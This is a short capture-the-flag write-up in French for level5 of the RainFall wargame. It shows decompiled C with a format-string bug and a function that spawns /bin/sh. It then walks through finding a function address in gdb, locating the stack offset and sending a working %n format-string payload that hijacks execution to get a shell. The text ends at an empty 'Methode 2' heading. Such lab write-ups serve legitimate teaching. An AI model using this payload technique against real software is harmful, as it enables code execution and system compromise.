Code source :

void o(void) {
  system("/bin/sh");
                    /* WARNING: Subroutine does not return */
  _exit(1);
}

void n(void) {
  char local_20c [520];
  
  fgets(local_20c,0x200,stdin);
  printf(local_20c);
                    /* WARNING: Subroutine does not return */
  exit(1);
}

void main(void) {
  n();
  return;
}

Solution : 

Ici cela est identique au lvl precedent cependant il y a un exit, 
cela ne posera pas de probleme car exit sera apeler sur la stack apres notre buffer donc il suffira de stocker l'adresse de o 
dans notre buffer pour que lorsque celui ci sera apeler a la fin de printf cela executera le fonction o

level5@RainFall:~$ gdb ./level5 
(gdb) p &o
$1 = (<text variable, no debug info> *) 0x80484a4 <o>

On recupere l'offset :

level5@RainFall:~$ python -c 'print("AAAA" + " %p " * 8)'| ./level5 
AAAA 0x200  0xb7fd1ac0  0xb7ff37d0  0x41414141  0x20702520  0x20702520  0x20702520  0x20702520 

Et on execute o :

(python -c 'print("\xa4\x84\x04\x08" + "%134513824x" + "%4n")'; cat) | ./level5 










Methode 2

